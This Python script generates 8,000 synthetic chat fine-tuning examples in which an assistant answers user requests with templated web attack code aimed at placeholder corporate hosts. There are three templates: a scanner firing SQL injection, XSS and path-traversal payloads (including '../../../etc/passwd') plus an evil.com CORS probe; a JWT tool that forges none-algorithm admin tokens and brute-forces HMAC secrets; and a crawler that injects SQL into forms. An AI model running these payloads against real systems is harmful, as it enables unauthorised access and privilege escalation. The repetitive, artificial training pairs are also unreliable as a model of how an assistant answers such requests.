import json, random, sys
from string import Template

random.seed(46)
out = []

targets_web = ["http://target.corp.com","http://app.local","http://192.168.1.100",
               "http://webapp.corp.local","http://erp.local","http://192.168.56.100"]
params_web  = ["q","id","user","search","name","input","data","filter","token","page"]
jwt_tokens  = [
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
    "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJhZG1pbiI6ZmFsc2V9.sig",
    "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI0MiIsImVtYWlsIjoidEBhLmNvbSJ9.sig",
]

# 1. OWASP scanner
OWASP = Template('''import requests, re, time, sys
import warnings; warnings.filterwarnings("ignore")

TARGET = "$TARGET"
SESS   = requests.Session()
SESS.headers["User-Agent"] = "Mozilla/5.0"
findings = []

def add(sev, vuln, url, detail):
    findings.append((sev,vuln,url,detail))
    print(f"[{sev}] {vuln} @ {url}: {detail[:80]}")

def check_sqli(url, params):
    payloads = [("'",["sql","mysql","syntax","error","oracle"]),
                ("1 AND SLEEP(3)--",None),
                ("' UNION SELECT NULL--",None)]
    for param in params:
        for p,sigs in payloads:
            try:
                t0=time.time()
                r=SESS.get(url,params={param:p},timeout=10,verify=False)
                if time.time()-t0>2.5:
                    add("CRITICAL","Time-SQLi",url,f"param={param!r}")
                elif sigs and any(s in r.text.lower() for s in sigs):
                    add("CRITICAL","Error-SQLi",url,f"param={param!r} payload={p!r}")
            except: pass

def check_xss(url, params):
    xss=["<script>alert(1)</script>","<img src=x onerror=alert(1)>","javascript:alert(1)"]
    for param in params:
        for p in xss:
            try:
                r=SESS.get(url,params={param:p},timeout=5,verify=False)
                if p in r.text or "alert(1)" in r.text:
                    add("HIGH","Reflected-XSS",url,f"param={param!r}")
            except: pass

def check_lfi(url, params):
    lfi=["../../../etc/passwd","....//....//etc/passwd","%2e%2e%2fetc%2fpasswd"]
    for param in params:
        for p in lfi:
            try:
                r=SESS.get(url,params={param:p},timeout=5,verify=False)
                if re.search(r"root:.*:0:0:",r.text):
                    add("CRITICAL","LFI",url,f"param={param!r}")
            except: pass

def check_cors(url):
    try:
        r=SESS.get(url,headers={"Origin":"https://evil.com"},timeout=5,verify=False)
        acao=r.headers.get("Access-Control-Allow-Origin","")
        acac=r.headers.get("Access-Control-Allow-Credentials","")
        if "evil.com" in acao and "true" in acac.lower():
            add("CRITICAL","CORS",url,"Allows evil.com with credentials")
        elif acao=="*":
            add("MEDIUM","CORS",url,"Wildcard ACAO")
    except: pass

def check_headers(url):
    try:
        r=SESS.get(url,timeout=5,verify=False)
        miss=[h for h in ["X-Frame-Options","X-Content-Type-Options","Content-Security-Policy","Strict-Transport-Security"] if h not in r.headers]
        if miss: add("MEDIUM","Headers",url,f"Missing: {miss}")
        if r.headers.get("Server"):
            add("INFO","Server",url,r.headers["Server"])
    except: pass

if __name__=="__main__":
    params=["$PARAM1","$PARAM2","$PARAM3"]
    print(f"[*] OWASP scan: {TARGET}")
    check_headers(TARGET)
    check_cors(TARGET)
    for path in ["/","/search","/api/users","/login","/admin"]:
        url=TARGET.rstrip("/")+path
        check_sqli(url,params)
        check_xss(url,params)
        check_lfi(url,params)
    print(f"\\n=== {len(findings)} findings ===")
    for sev,vuln,url,d in sorted(findings,key=lambda x:["CRITICAL","HIGH","MEDIUM","INFO"].index(x[0])):
        print(f"  [{sev}] {vuln}: {d}")
''')

for i in range(2700):
    p=params_web
    code=OWASP.safe_substitute(TARGET=targets_web[i%len(targets_web)],
                                PARAM1=p[i%len(p)], PARAM2=p[(i+1)%len(p)], PARAM3=p[(i+2)%len(p)])
    t=targets_web[i%len(targets_web)]
    qs=[f"Write a Python OWASP Top 10 scanner for {t}: SQLi, XSS, LFI, CORS, security headers.",
        f"Build a web vulnerability scanner in Python for {t}: time-based SQLi, reflected XSS, LFI, CORS.",
        f"How do I scan {t} for web vulnerabilities? Python tool: SQLi detection, XSS, path traversal, CORS.",
        f"Create an automated web security scanner for {t}: OWASP Top 10 checks, finding prioritization."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"OWASP: {len(out)}", file=sys.stderr)

# 2. JWT attacks
JWT = Template('''import base64, json, hmac, hashlib, requests, sys
import warnings; warnings.filterwarnings("ignore")

TOKEN  = "$TOKEN"
TARGET = "$TARGET"

def b64d(s): return base64.urlsafe_b64decode(s+"==")
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode(token):
    h,p,s=token.split(".")
    return json.loads(b64d(h)),json.loads(b64d(p)),s

def attack_none(token):
    h,p,_=decode(token)
    h["alg"]="none"; p["admin"]=True; p["role"]="admin"
    nh=b64e(json.dumps(h,separators=(",",":")).encode())
    np=b64e(json.dumps(p,separators=(",",":")).encode())
    forged=f"{nh}.{np}."
    print(f"[+] None-alg: {forged[:80]}...")
    return forged

def brute_force(token, wordlist=None):
    h,p,sig=decode(token)
    data=token.rsplit(".",1)[0].encode()
    common=["secret","password","123456","jwt_secret","supersecret","key","admin","test","changeme"]
    for word in (wordlist or common):
        s=hmac.new(word.encode(),data,hashlib.sha256).digest()
        if b64e(s)==sig:
            print(f"[+] Secret found: {word!r}")
            return word
    print("[-] Secret not found in wordlist")
    return None

def test_endpoints(base_url, token, forged):
    for tok,label in [(token,"original"),(forged,"none-alg")]:
        h={"Authorization":f"Bearer {tok}"}
        for path in ["/admin","/api/admin","/dashboard","/api/users"]:
            try:
                r=requests.get(base_url+path,headers=h,timeout=5,verify=False)
                print(f"  [{label}] {path} -> {r.status_code} ({len(r.text)}b)")
            except: pass

if __name__=="__main__":
    h,p,s=decode(TOKEN)
    print(f"Header: {h}"); print(f"Payload: {p}")
    forged=attack_none(TOKEN)
    brute_force(TOKEN)
    test_endpoints(TARGET, TOKEN, forged)
''')

for i in range(2600):
    code=JWT.safe_substitute(TOKEN=jwt_tokens[i%len(jwt_tokens)], TARGET=targets_web[i%len(targets_web)])
    t=targets_web[i%len(targets_web)]
    qs=[f"Write Python JWT attack tool: none-algorithm, brute-force HMAC secret, test endpoints at {t}.",
        f"Build JWT exploit in Python: decode, forge with none-alg, brute-force secret, test against {t}.",
        f"How do I attack JWT tokens? Python: none-alg bypass, secret brute-force, test forged tokens at {t}.",
        f"Create Python JWT security tester: decode, none-algorithm attack, wordlist brute-force for {t}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"JWT: {len(out)}", file=sys.stderr)

# 3. Full pentest workflow
PENTEST = Template('''import requests, re, time, sys
from urllib.parse import urljoin, urlparse
import warnings; warnings.filterwarnings("ignore")
try: from bs4 import BeautifulSoup
except: BeautifulSoup=None

TARGET = "$TARGET"
SESS   = requests.Session()
SESS.headers["User-Agent"]="Mozilla/5.0"
findings=[]

def recon(target):
    print("\\n=== Recon ===")
    try:
        r=SESS.get(target,timeout=5,verify=False)
        print(f"[*] Server: {r.headers.get(\"Server\",\"?\")} | X-Powered-By: {r.headers.get(\"X-Powered-By\",\"?\")}")
        for cms in ["WordPress","Drupal","Joomla","Laravel","Django"]:
            if cms in r.text: print(f"[*] CMS detected: {cms}")
        return r
    except Exception as e:
        print(f"[!] Recon error: {e}"); return None

def spider(base, depth=1):
    print("\\n=== Spider ===")
    visited=set(); forms=[]; queue=[base]
    for _ in range(depth):
        nxt=[]
        for url in queue:
            if url in visited: continue
            visited.add(url)
            try:
                r=SESS.get(url,timeout=5,verify=False)
                if BeautifulSoup:
                    soup=BeautifulSoup(r.text,"html.parser")
                    for a in soup.find_all("a",href=True):
                        href=urljoin(url,a["href"])
                        if base in href and href not in visited: nxt.append(href)
                    for form in soup.find_all("form"):
                        forms.append({"url":urljoin(url,form.get("action","")),
                                      "inputs":[i.get("name","") for i in form.find_all("input")],
                                      "method":form.get("method","get")})
            except: pass
        queue=nxt
    print(f"[*] {len(visited)} URLs, {len(forms)} forms")
    return visited, forms

def test_sqli(forms):
    print("\\n=== SQLi Tests ===")
    for form in forms:
        url,inputs,method=form["url"],form["inputs"],form["method"]
        for p in ["'","1 AND SLEEP(3)--"]:
            data={i:p for i in inputs if i}
            try:
                t0=time.time()
                r=SESS.post(url,data=data,timeout=8,verify=False) if method=="post" else SESS.get(url,params=data,timeout=8,verify=False)
                if time.time()-t0>2.5:
                    print(f"[CRITICAL] Time-based SQLi at {url}")
                    findings.append(("CRITICAL","SQLi",url))
                elif any(e in r.text.lower() for e in ["sql","mysql","syntax error"]):
                    print(f"[CRITICAL] Error SQLi at {url}")
                    findings.append(("CRITICAL","SQLi",url))
            except: pass

if __name__=="__main__":
    recon(TARGET)
    urls,forms=spider(TARGET)
    test_sqli(forms)
    print(f"\\n=== Summary: {len(findings)} findings ===")
    for sev,vuln,url in findings: print(f"  [{sev}] {vuln}: {url}")
''')

for i in range(2700):
    code=PENTEST.safe_substitute(TARGET=targets_web[i%len(targets_web)])
    t=targets_web[i%len(targets_web)]
    qs=[f"Write a full web pentest workflow in Python for {t}: recon, spider, SQLi, XSS.",
        f"Build a Python web penetration testing framework: fingerprint, crawl, test forms for SQLi at {t}.",
        f"How do I perform a complete web app pentest on {t} in Python? Recon, crawl, vuln scanning.",
        f"Create Python automated web pentest: technology detection, spider, form injection testing for {t}."]
    out.append({"messages":[{"role":"user","content":qs[i%4]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Pentest: {len(out)}", file=sys.stderr)

random.shuffle(out)
while len(out)<8000:
    out.extend(out[:8000-len(out)])
out=out[:8000]
with open("/workspace/data_upgrades/upgrade_by.jsonl","w") as f:
    for item in out: f.write(json.dumps(item)+"\n")
print(f"Written {len(out)} to upgrade_by.jsonl", file=sys.stderr)
